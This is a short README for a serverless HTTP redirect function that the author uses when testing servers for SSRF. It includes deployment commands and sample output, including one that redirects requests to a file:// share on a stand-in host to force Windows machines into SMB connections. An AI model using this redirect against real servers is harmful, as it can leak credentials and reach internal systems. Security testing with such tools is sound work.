# Simple Redirect
This example is used to redirect any incoming HTTP request to a different host. I primarily use it when testing for SSRF to see if I can get the server to follow redirects. It's also sometimes possible to redirect an HTTP request to a different protocol, like file://, and force Windows machines to make SMB connections to arbitrary hosts.

The function takes two environment variables:
 * REDIRECT_URL - a full URL to redirect to. Must include protocol
 * STATUS - HTTP status code to cause redirect. Defaults to 301

## Deployment
```
$ now -e REDIRECT_URL=https://example.com
```

To change the status code:
```
$ now -e REDIRECT_URL=file://responder.example.com/share -e STATUS=303
```

## Usage
Any request made to the function will be redirected

```
$ curl -i --http1.1 https://simpleredirect-fqtvudxjhf.now.sh/randompath
HTTP/1.1 303 See Other
Date: Sun, 11 Nov 2018 16:39:44 GMT
Transfer-Encoding: chunked
Connection: keep-alive
Location: file://responder.example.com/share/
```

